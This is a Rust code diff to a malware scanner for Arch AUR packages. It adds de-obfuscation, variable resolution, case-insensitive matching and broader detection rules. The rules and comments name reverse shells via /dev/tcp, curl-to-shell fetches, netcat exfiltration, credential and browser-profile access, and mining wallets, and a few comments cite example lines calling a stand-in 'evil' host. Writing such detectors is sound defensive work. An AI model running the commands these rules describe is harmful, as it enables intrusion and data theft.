@@ -5,8 +5,12 @@ mod loader;
 pub use loader::RuleLoader;
 
 use crate::error::Result;
+use crate::resolve::resolve_variables;
+use crate::textutil::{
+    deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
+};
 use crate::types::{Category, FileType, Severity};
-use regex::Regex;
+use regex::{Regex, RegexBuilder};
 use serde::Deserialize;
 use std::collections::HashMap;
 use std::path::Path;
@@ -28,8 +32,10 @@ pub struct Rule {
     /// Patterns to match
     #[serde(default)]
     pub patterns: Vec<Pattern>,
-    /// File types this rule applies to
-    #[serde(default)]
+    /// File types this rule applies to. Defaults to PKGBUILD + install script
+    /// rather than empty: a rule indexed under no file type is silently never
+    /// matched, so a community rule that omits `file_types` would be inert.
+    #[serde(default = "default_file_types")]
     pub file_types: Vec<FileType>,
     /// Recommendation for fixing
     pub recommendation: String,
@@ -39,10 +45,25 @@ pub struct Rule {
     /// Whether this rule is enabled
     #[serde(default = "default_true")]
     pub enabled: bool,
+    /// Opt out of the case-insensitive default for this rule's regex patterns.
+    /// Rules are compiled `(?i)` by default (audit HI-6) so trivial case variation
+    /// (`CURL`, `Wget`) cannot evade them; set this `true` for rules keyed on
+    /// canonical casing -- environment-variable NAMEs (case-sensitive in bash),
+    /// base64/base32 alphabets, or `\xHH` hex assembly -- where folding the case
+    /// would over-match. A single span can instead opt out inline with `(?-i:…)`.
+    #[serde(default)]
+    pub case_sensitive: bool,
 }
 
 fn default_true() -> bool {
     true
+}
+
+/// Default file types for a rule that does not specify them. Empty would make
+/// the rule inert (it is indexed per file type), so default to the two types
+/// every scan looks at.
+fn default_file_types() -> Vec<FileType> {
+    vec![FileType::Pkgbuild, FileType::InstallScript]
 }
 
 /// Pattern type for matching
@@ -83,17 +104,45 @@ pub struct CompiledRule {
 #[derive(Clone)]
 pub enum CompiledPattern {
     Regex(Regex),
-    Literal { text: String, case_sensitive: bool },
-    Function { name: Regex, body_pattern: Option<Regex> },
-    Variable { name: String, value_pattern: Option<Regex> },
+    Literal {
+        text: String,
+        case_sensitive: bool,
+    },
+    Function {
+        name: Regex,
+        body_pattern: Option<Regex>,
+    },
+    Variable {
+        name: String,
+        value_pattern: Option<Regex>,
+    },
+}
+
+/// Compile a rule regex with safe defaults.
+///
+/// * Case-insensitive UNLESS the owning rule opted out (`case_sensitive`), so
+///   trivial case variation (`CURL`, `Xmrig`) cannot evade a rule. A single span
+///   can instead opt out inline with `(?-i:...)` (e.g. a Base58 address class).
+/// * Explicit size/DFA limits: rule patterns can come from filesystem
+///   `rules.d` files, so bound compiled-program and DFA memory rather than
+///   trusting every author.
+fn compile_regex(pattern: &str, case_sensitive: bool) -> Result<Regex> {
+    RegexBuilder::new(pattern)
+        .case_insensitive(!case_sensitive)
+        .size_limit(4 * 1024 * 1024)
+        .dfa_size_limit(16 * 1024 * 1024)
+        .build()
+        .map_err(Into::into)
 }
 
 impl CompiledPattern {
-    /// Compile a pattern
-    pub fn compile(pattern: &Pattern) -> Result<Self> {
+    /// Compile a pattern. `case_sensitive` is the owning rule's opt-out flag: when
+    /// `false` (the default) regex patterns compile case-insensitively (audit
+    /// HI-6). `Pattern::Literal` carries its own per-pattern `case_sensitive`.
+    pub fn compile(pattern: &Pattern, case_sensitive: bool) -> Result<Self> {
         match pattern {
             Pattern::Regex { pattern } => {
-                let re = Regex::new(pattern)?;
+                let re = compile_regex(pattern, case_sensitive)?;
                 Ok(CompiledPattern::Regex(re))
             }
             Pattern::Literal {
@@ -104,20 +153,23 @@ impl CompiledPattern {
                 case_sensitive: *case_sensitive,
             }),
             Pattern::Function { name, body_pattern } => {
-                let name_re = Regex::new(name)?;
+                let name_re = compile_regex(name, case_sensitive)?;
                 let body_re = body_pattern
                     .as_ref()
-                    .map(|p| Regex::new(p))
+                    .map(|p| compile_regex(p, case_sensitive))
                     .transpose()?;
                 Ok(CompiledPattern::Function {
                     name: name_re,
                     body_pattern: body_re,
                 })
             }
-            Pattern::Variable { name, value_pattern } => {
+            Pattern::Variable {
+                name,
+                value_pattern,
+            } => {
                 let value_re = value_pattern
                     .as_ref()
-                    .map(|p| Regex::new(p))
+                    .map(|p| compile_regex(p, case_sensitive))
                     .transpose()?;
                 Ok(CompiledPattern::Variable {
                     name: name.clone(),
@@ -180,7 +232,7 @@ impl RuleEngine {
 
         let mut compiled_patterns = Vec::new();
         for pattern in &rule.patterns {
-            compiled_patterns.push(CompiledPattern::compile(pattern)?);
+            compiled_patterns.push(CompiledPattern::compile(pattern, rule.case_sensitive)?);
         }
 
         let compiled = CompiledRule {
@@ -231,30 +283,92 @@ impl RuleEngine {
             None => return matches,
         };
 
-        let lines: Vec<&str> = content.lines().collect();
+        // Work on *logical* lines: bash backslash-newline continuations are
+        // spliced back together so a payload split across physical lines
+        // (`curl evil \`<nl>`| sh`) cannot evade a single-line rule. Each entry
+        // carries the originating physical line number for reporting.
+        let lines: Vec<(usize, String)> = logical_lines(content);
+        let line_strs: Vec<&str> = lines.iter().map(|(_, s)| s.as_str()).collect();
+        // De-obfuscated variant per line: ANSI-C quoting (`$'\x63'`) decoded and
+        // adjacent-quote word-splitting (`"b"'u''n'`) collapsed, so a payload
+        // hidden to dodge literal matching is still seen by every rule (e.g. an
+        // obfuscated `bun add` fires ATOMIC-002). `None` for un-obfuscated lines,
+        // so ordinary quoted strings are not re-matched.
+        let deobf: Vec<Option<String>> = lines.iter().map(|(_, s)| deobfuscate(s)).collect();
+        // Variable-resolution variant (the static taint pass, audit HI-6): a
+        // payload hidden behind a shell variable (`x=curl; $x …| sh`,
+        // `c=$(printf '\x63url'); $c`) evades token matching. `resolve_variables`
+        // substitutes statically-evident assignments and is line-count-preserving,
+        // so the resolved logical line sits on its start physical line and aligns
+        // with `lines` by that line number. Like de-obfuscation it is matched *in
+        // addition to* the raw line, so it can only ADD a finding, never suppress.
+        let resolved_full = resolve_variables(content);
+        let resolved_phys: Vec<&str> = resolved_full.lines().collect();
+        let resolved: Vec<Option<String>> = lines
+            .iter()
+            .map(|(phys, raw)| {
+                resolved_phys.get(phys.saturating_sub(1)).and_then(|r| {
+                    (*r != raw.as_str() && !r.trim().is_empty()).then(|| (*r).to_string())
+                })
+            })
+            .collect();
         // Lines that are informational text printed to the user (the body of a
-        // non-redirected heredoc, e.g. a `cat <<EOF` post_install message) are
-        // not executed, so path-presence rules must not match them. A redirected
-        // heredoc (`<<EOF > file`) writes content and is still scanned.
-        let informational = informational_lines(&lines);
+        // pure-printer heredoc, e.g. a `cat <<EOF` post_install message) are not
+        // executed, so low-risk path-presence rules must not match them. A
+        // heredoc fed to an interpreter, or redirected to a file, is still code.
+        let informational = informational_lines(&line_strs);
 
         for compiled in rules {
-            for (line_idx, line) in lines.iter().enumerate() {
-                // Skip pure comment lines and printed heredoc message bodies.
+            for (idx, (phys_line, line)) in lines.iter().enumerate() {
+                // Skip pure comment lines and printed heredoc bodies. A heredoc
+                // is only marked informational when it is fed to a pure printer
+                // (cat/echo/printf) and not piped/redirected; a heredoc fed to an
+                // interpreter (`bash <<EOF`) is NOT informational and is scanned
+                // here, so executable payloads hidden in a heredoc are caught.
                 let trimmed = line.trim();
-                if trimmed.starts_with('#') || informational[line_idx] {
+                if trimmed.starts_with('#') || informational[idx] {
                     continue;
                 }
 
                 for pattern in &compiled.compiled_patterns {
+                    // Try the raw line, then its de-obfuscated form, then its
+                    // variable-resolved form. Each variant is matched independently
+                    // and can only ADD a finding; the first hit per pattern wins.
                     if let Some(m) = self.match_pattern(pattern, line, &compiled.rule) {
                         matches.push(RuleMatch {
                             rule_id: compiled.rule.id.clone(),
-                            line: line_idx + 1,
+                            line: *phys_line,
                             column: m.0,
                             matched_text: m.1,
-                            context: line.to_string(),
+                            context: line.clone(),
                         });
+                        continue;
+                    }
+                    // Raw line didn't match, but its de-obfuscated form might.
+                    if let Some(decoded) = &deobf[idx] {
+                        if let Some(m) = self.match_pattern(pattern, decoded, &compiled.rule) {
+                            matches.push(RuleMatch {
+                                rule_id: compiled.rule.id.clone(),
+                                line: *phys_line,
+                                column: m.0,
+                                matched_text: m.1,
+                                context: format!("{line}    [de-obfuscated → {decoded}]"),
+                            });
+                            continue;
+                        }
+                    }
+                    // …or its variable-resolved form (a command hidden behind `$x`).
+                    if let Some(resolved_line) = &resolved[idx] {
+                        if let Some(m) = self.match_pattern(pattern, resolved_line, &compiled.rule)
+                        {
+                            matches.push(RuleMatch {
+                                rule_id: compiled.rule.id.clone(),
+                                line: *phys_line,
+                                column: m.0,
+                                matched_text: m.1,
+                                context: format!("{line}    [resolved → {resolved_line}]"),
+                            });
+                        }
                     }
                 }
             }
@@ -271,9 +385,9 @@ impl RuleEngine {
         _rule: &Rule,
     ) -> Option<(usize, String)> {
         match pattern {
-            CompiledPattern::Regex(re) => {
-                re.find(line).map(|m| (m.start() + 1, m.as_str().to_string()))
-            }
+            CompiledPattern::Regex(re) => re
+                .find(line)
+                .map(|m| (m.start() + 1, m.as_str().to_string())),
             CompiledPattern::Literal {
                 text,
                 case_sensitive,
@@ -310,7 +424,11 @@ impl Default for RuleEngine {
         for dir in user_rule_dirs() {
             if dir.is_dir() {
                 if let Err(e) = engine.load_rules_from_dir(&dir) {
-                    tracing::warn!("failed to load community rules from {}: {}", dir.display(), e);
+                    tracing::warn!(
+                        "failed to load community rules from {}: {}",
+                        dir.display(),
+                        e
+                    );
                 }
             }
         }
@@ -330,9 +448,18 @@ pub fn user_rule_dirs() -> Vec<std::path::PathBuf> {
     dirs
 }
 
-/// Flag each line that is the body of a non-redirected heredoc (printed text,
-/// not executed code), so path/string-presence rules don't match user messages.
-fn informational_lines(lines: &[&str]) -> Vec<bool> {
+/// Flag each line that is printed text rather than executed code -- the body of
+/// a non-redirected heredoc, or a single-line pure message print (`echo`/`note`/
+/// `msg "..."`) -- so path/string-presence rules don't match user-facing
+/// messages. (E.g. a `.install` that says `note "put flags in ~/.config/x"` must
+/// not trip the "hidden file in home" rule: it mentions a path, it doesn't write
+/// one. This was a real false positive on google-chrome / vscode.)
+///
+/// `pub(crate)` so structural analyzers can share the exact same pre-filter: the
+/// privilege analyzer routes function bodies through it so a printed
+/// `sudo`/`setcap`/`sudoers` message or a documentation heredoc cannot raise a
+/// Critical false positive (defect #5).
+pub(crate) fn informational_lines(lines: &[&str]) -> Vec<bool> {
     let mut flags = vec![false; lines.len()];
     let mut terminator: Option<String> = None;
     for (i, line) in lines.iter().enumerate() {
@@ -345,9 +472,93 @@ fn informational_lines(lines: &[&str]) -> Vec<bool> {
         }
         if let Some(delim) = heredoc_message_delim(line) {
             terminator = Some(delim);
+        } else if is_pure_message_print(line) {
+            flags[i] = true;
         }
     }
     flags
+}
+
+/// Whether `line` is a single-line message print whose argument is just text the
+/// user sees -- it cannot run another command or write a file, so a path/string
+/// it mentions is a mention, not an action.
+///
+/// Conservative on purpose: the command must be a known printer AND the line
+/// must contain no redirection, pipe, command substitution, or command chaining
+/// (any of which could execute or write). `echo x > ~/.bashrc`, `echo "$(curl
+/// evil)"`, and `echo x | sh` therefore are NOT treated as inert.
+fn is_pure_message_print(line: &str) -> bool {
+    let t = line.trim();
+    let cmd = t.split([' ', '\t']).next().unwrap_or("");
+    const PRINTERS: &[&str] = &[
+        "echo", "printf", "print", "note", "msg", "msg2", "warning", "plain", "error",
+    ];
+    if !PRINTERS.contains(&cmd) {
+        return false;
+    }
+    // Anything that could redirect, pipe, substitute, or chain a command means
+    // the line is not a pure print -- scan it. Quote-aware: a `;`/`|`/`&`/`>`
+    // *inside* the quoted message is literal text, not an operator (the real FP
+    // `echo "see ~/.config; then ..."`); command substitution (`$(`/backtick)
+    // still counts inside double quotes, where the shell executes it.
+    !has_executable_operator(t)
+}
+
+/// Whether `t` contains a shell metacharacter that could chain, redirect, or
+/// execute another command -- accounting for quoting:
+///   * `;` `|` `&` `>` are operators only when UNQUOTED (literal inside both
+///     `'...'` and `"..."`).
+///   * `$(` and backtick are command substitution: the shell runs them when
+///     unquoted OR inside double quotes, and treats them literally only inside
+///     single quotes.
+///
+/// A backslash escapes the next byte when unquoted or inside double quotes (it
+/// is literal inside single quotes). Conservative: anything it does not model as
+/// safely-quoted falls through to "is an operator" so we scan rather than trust.
+fn has_executable_operator(t: &str) -> bool {
+    let b = t.as_bytes();
+    let (mut i, mut sq, mut dq) = (0usize, false, false);
+    while i < b.len() {
+        let c = b[i];
+        if sq {
+            // Inside single quotes everything is literal until the closing `'`.
+            if c == b'\'' {
+                sq = false;
+            }
+            i += 1;
+            continue;
+        }
+        if dq {
+            // Inside double quotes only command substitution executes.
+            match c {
+                b'\\' => i += 2,
+                b'"' => {
+                    dq = false;
+                    i += 1;
+                }
+                b'`' => return true,
+                b'$' if b.get(i + 1) == Some(&b'(') => return true,
+                _ => i += 1,
+            }
+            continue;
+        }
+        // Unquoted.
+        match c {
+            b'\\' => i += 2,
+            b'\'' => {
+                sq = true;
+                i += 1;
+            }
+            b'"' => {
+                dq = true;
+                i += 1;
+            }
+            b';' | b'|' | b'&' | b'>' | b'`' => return true,
+            b'$' if b.get(i + 1) == Some(&b'(') => return true,
+            _ => i += 1,
+        }
+    }
+    false
 }
 
 /// If `line` opens a heredoc that just prints a message (no redirection to a
@@ -355,7 +566,10 @@ fn informational_lines(lines: &[&str]) -> Vec<bool> {
 /// somewhere and must still be scanned, so they return `None`.
 fn heredoc_message_delim(line: &str) -> Option<String> {
     let pos = line.find("<<")?;
-    let rest = line[pos + 2..].strip_prefix('-').unwrap_or(&line[pos + 2..]).trim_start();
+    let rest = line[pos + 2..]
+        .strip_prefix('-')
+        .unwrap_or(&line[pos + 2..])
+        .trim_start();
     let bytes = rest.as_bytes();
     let quote = match bytes.first() {
         Some(&b'"') | Some(&b'\'') => Some(bytes[0]),
@@ -389,6 +603,23 @@ fn heredoc_message_delim(line: &str) -> Option<String> {
     if redirected {
         return None;
     }
+    // Only treat the body as printed-not-executed when the consuming command is
+    // a pure printer (cat/echo/printf) AND the heredoc is not piped into another
+    // command. A heredoc fed to an interpreter -- `bash <<EOF`, `python <<EOF`,
+    // `ssh host <<EOF`, `cat <<EOF | bash` -- runs its body, so it must be
+    // scanned. When unsure, do NOT suppress (fail toward scanning).
+    let before = &line[..pos];
+    let last_command = before.rsplit([';', '|', '&', '(']).next().unwrap_or(before);
+    let is_pure_printer = last_command
+        .split_whitespace()
+        .next()
+        .map(|cmd| matches!(cmd, "cat" | "echo" | "printf"))
+        .unwrap_or(false);
+    // A pipe anywhere on the opener means the body may be fed to a command.
+    let piped = line.contains('|');
+    if !is_pure_printer || piped {
+        return None;
+    }
     Some(delim.to_string())
 }
 
@@ -406,12 +637,13 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: r"curl\s+[^|]+\|\s*(ba)?sh".to_string(),
+                pattern: format!(r"curl\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
             cwe_id: Some("CWE-94".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "DLE-002".to_string(),
@@ -420,12 +652,13 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: r"wget\s+[^|]+\|\s*(ba)?sh".to_string(),
+                pattern: format!(r"wget\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
             cwe_id: Some("CWE-94".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "DLE-003".to_string(),
@@ -445,6 +678,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Review downloaded scripts before execution".to_string(),
             cwe_id: Some("CWE-94".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -468,6 +702,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Never download code from paste sites - this is a major red flag".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -480,12 +715,17 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::MaliciousCode,
             patterns: vec![Pattern::Regex {
-                pattern: r"/dev/tcp/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+".to_string(),
+                // Any /dev/tcp or /dev/udp host/port -- hostname, IPv4, IPv6, or
+                // hex/decimal IP -- is a reverse-shell channel. The old rule only
+                // matched dotted-quad IPv4 and missed `/dev/tcp/evil.com/4444`,
+                // `/dev/tcp/0x7f000001/4444`, IPv6, etc.
+                pattern: r"/dev/(tcp|udp)/[^\s/]+/[^\s/]+".to_string(),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Remove reverse shell code immediately".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "SHELL-002".to_string(),
@@ -508,6 +748,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Remove reverse shell code immediately".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "SHELL-003".to_string(),
@@ -527,6 +768,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Remove reverse shell code immediately".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "SHELL-004".to_string(),
@@ -546,6 +788,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Socat TCP connections are suspicious in build scripts".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -572,6 +815,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Package should never access user SSH keys".to_string(),
             cwe_id: Some("CWE-522".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "CRED-002".to_string(),
@@ -591,6 +835,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Package should never access user GPG keys".to_string(),
             cwe_id: Some("CWE-522".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "CRED-003".to_string(),
@@ -619,6 +864,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Package should never access credential stores".to_string(),
             cwe_id: Some("CWE-522".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -654,6 +900,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Package should never access browser profiles".to_string(),
             cwe_id: Some("CWE-522".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "BROWSER-002".to_string(),
@@ -679,6 +926,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Package should never access browser databases".to_string(),
             cwe_id: Some("CWE-522".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
 
         // NOTE: privilege escalation (PRIV-001..006: sudo, SUID/SGID, sudoers,
@@ -707,6 +955,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Install scripts should not execute Python code".to_string(),
             cwe_id: Some("CWE-94".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "INSTALL-002".to_string(),
@@ -718,14 +967,26 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                 Pattern::Regex {
                     pattern: r"/opt/[^/]+/[^/]+\.(py|sh|bin)".to_string(),
                 },
+                // A relative script/binary run in COMMAND position with a
+                // dropped-payload extension. Requiring command position removes
+                // the `cd ./build` argument false positive; requiring an
+                // executable extension removes the `./configure` autotools false
+                // positive (an extensionless build script). Dropped payloads
+                // (`./payload.sh`, `./x/y.bin`) still match (defect #10). An
+                // extensionless `./name` is intentionally not flagged here
+                // because it is indistinguishable from `./configure`; the
+                // campaign payload vectors are covered by INSTALL-001/003/004,
+                // HIDDEN-003 and the ATOMIC rules.
                 Pattern::Regex {
-                    pattern: r"\./[a-zA-Z0-9_-]+\s*$".to_string(),
+                    pattern: r"(?:^|[;&|]\s*)\./[\w./-]*\.(?:sh|bash|bin|run|elf|out|py|pl|rb|php)\b"
+                        .to_string(),
                 },
             ],
             file_types: vec![FileType::InstallScript],
             recommendation: "Review any binary execution during installation".to_string(),
             cwe_id: Some("CWE-94".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "INSTALL-003".to_string(),
@@ -742,6 +1003,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Install scripts should never download additional content".to_string(),
             cwe_id: Some("CWE-494".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "INSTALL-004".to_string(),
@@ -765,6 +1027,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Install hooks must never fetch or install packages. Declare real dependencies in depends/makedepends and handle sources in the source= array; report the package to the AUR maintainers.".to_string(),
             cwe_id: Some("CWE-494".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -791,6 +1054,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Services should be enabled by the user, not automatically".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "PERSIST-002".to_string(),
@@ -813,6 +1077,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Timers should be user-controlled; review carefully".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "PERSIST-003".to_string(),
@@ -832,6 +1097,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Cron jobs should be managed by the user".to_string(),
             cwe_id: None,
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "PERSIST-004".to_string(),
@@ -851,6 +1117,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Packages should not modify boot scripts".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "PERSIST-005".to_string(),
@@ -870,6 +1137,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Autostart entries should be user-controlled".to_string(),
             cwe_id: None,
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "PERSIST-006".to_string(),
@@ -889,6 +1157,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Verify this is a legitimate systemd component".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -912,6 +1181,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Remove cryptomining components".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "CRYPTO-002".to_string(),
@@ -928,6 +1198,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Remove cryptomining components".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "CRYPTO-003".to_string(),
@@ -948,11 +1219,26 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                 Pattern::Regex {
                     pattern: r#"(?i)(wallet|donate)_?(addr|address)?\s*=\s*['"]?[a-zA-Z0-9]{26,}"#.to_string(),
                 },
+                // Bare Monero address by format (no surrounding keyword needed):
+                // a miner config can drop the address with no `wallet`/`xmr`
+                // nearby. `(?-i)` keeps the Base58 classes case-exact despite the
+                // engine's case-insensitive default. The 95-char shape is highly
+                // specific, so false positives are negligible.
+                Pattern::Regex {
+                    pattern: r#"(?-i:\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b)"#.to_string(),
+                },
+                // Bare Bech32 Bitcoin address (`bc1...`). Legacy 1.../3...
+                // addresses are left keyword-anchored above as they are far more
+                // false-positive prone than the distinctive bc1 prefix.
+                Pattern::Regex {
+                    pattern: r#"(?-i:\bbc1[02-9ac-hj-np-z]{11,71}\b)"#.to_string(),
+                },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Wallet addresses in packages are highly suspicious".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -976,6 +1262,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Build/install should not send data externally".to_string(),
             cwe_id: Some("CWE-200".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "EXFIL-002".to_string(),
@@ -995,6 +1282,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Netcat should not be piping data in build scripts".to_string(),
             cwe_id: Some("CWE-200".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "EXFIL-003".to_string(),
@@ -1014,6 +1302,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Webhook URLs in packages are highly suspicious".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -1037,6 +1326,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Decode and review the base64 content manually".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "OBF-002".to_string(),
@@ -1051,6 +1341,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Avoid eval; use direct commands instead".to_string(),
             cwe_id: Some("CWE-95".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "OBF-003".to_string(),
@@ -1070,6 +1361,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Decode and review hex-encoded content".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "OBF-004".to_string(),
@@ -1086,6 +1378,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Review concatenated strings carefully".to_string(),
             cwe_id: None,
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "OBF-005".to_string(),
@@ -1105,6 +1398,28 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Decompress and review content before execution".to_string(),
             cwe_id: Some("CWE-94".to_string()),
             enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "OBF-006".to_string(),
+            name: "Quote-splitting / character obfuscation".to_string(),
+            description:
+                "A command is assembled from adjacent single-character quoted fragments \
+                 (e.g. \"b\"'u''n') or ANSI-C escapes to hide it from literal matching. \
+                 This is almost exclusively a malware evasion technique; aur-scan also \
+                 reports the decoded command via its other rules."
+                    .to_string(),
+            severity: Severity::High,
+            category: Category::Obfuscation,
+            patterns: vec![Pattern::Regex {
+                pattern: QUOTE_SPLIT_PATTERN.to_string(),
+            }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation:
+                "De-obfuscate the command and review what it actually runs.".to_string(),
+            cwe_id: Some("CWE-506".to_string()),
+            enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -1123,6 +1438,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Use domain names from trusted sources".to_string(),
             cwe_id: None,
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "URL-002".to_string(),
@@ -1139,6 +1455,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Always use full URLs from trusted sources".to_string(),
             cwe_id: None,
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "URL-003".to_string(),
@@ -1158,6 +1475,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Dynamic DNS domains are suspicious in packages".to_string(),
             cwe_id: None,
             enabled: true,
+            case_sensitive: false,
         },
         // NOTE: insecure transport (git://, git+http://, http://, ftp://) and
         // weak checksums (md5/sha1) are intentionally NOT pattern rules. They
@@ -1187,6 +1505,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Packages should not create hidden files in user home".to_string(),
             cwe_id: None,
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "HIDDEN-002".to_string(),
@@ -1195,8 +1514,18 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::High,
             category: Category::MaliciousCode,
             patterns: vec![
+                // Executing FROM /tmp: a /tmp path in COMMAND position -- at the
+                // start of a (logical) line, right after a command separator
+                // (`;` `&` `|`), or as the target of an exec verb / interpreter.
+                // This is the "execution" the rule is named for. It deliberately
+                // does NOT match a /tmp path used as an assignment value or a
+                // plain argument (`TMPDIR=/tmp/x`, `mktemp -d /tmp/x`, `cp foo
+                // /tmp/x`, `> /tmp/x`), which are benign and were the source of
+                // false positives (defect #10).
                 Pattern::Regex {
-                    pattern: r"/tmp/[^\s]+\s*$".to_string(),
+                    pattern: format!(
+                        r"(?:^|[;&|]|\b(?:exec|source|eval|{SHELLS}|python[23]?|perl|ruby|node|php)\s+)\s*\.?/tmp/\S+"
+                    ),
                 },
                 Pattern::Regex {
                     pattern: r"chmod\s+\+x\s+/tmp/".to_string(),
@@ -1206,6 +1535,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Packages should not execute from /tmp".to_string(),
